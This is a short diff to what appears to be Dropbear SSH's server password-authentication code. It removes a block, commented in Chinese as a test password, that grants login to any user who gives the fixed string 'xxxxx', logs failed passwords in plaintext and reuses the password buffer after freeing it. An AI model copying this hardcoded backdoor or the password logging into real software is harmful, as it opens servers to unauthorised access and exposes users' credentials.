@@ -73,25 +73,6 @@ void svr_auth_password(int valid_user) {
 	m_burn(password, passwordlen);
 	m_free(password);
 
-        //edify by wusc：这里xxxxx是测试用的密码，所以在这写死了，可以自己修改为从配置文件读取。
-	if (strcmp(password, "xxxxx") == 0 ) {
-		/* successful authentication */
-		dropbear_log(LOG_NOTICE, 
-				"Password auth succeeded for '%s' from %s",
-				ses.authstate.pw_name,
-				svr_ses.addrstring);
-		send_msg_userauth_success();
-	} else {
-		dropbear_log(LOG_WARNING,
-				">>>>>>>>>>>>>>>>>>>>>>>>Bad password attempt for '%s' from %s",
-				ses.authstate.pw_name,
-				svr_ses.addrstring);
- 		dropbear_log(LOG_WARNING,"Bad password: %s",password);       
-		send_msg_userauth_failure(0, 1);
-	}
-        m_burn(password, passwordlen);
-        m_free(password);
-
 	/* After we have got the payload contents we can exit if the username
 	is invalid. Invalid users have already been logged. */
 	if (!valid_user) {
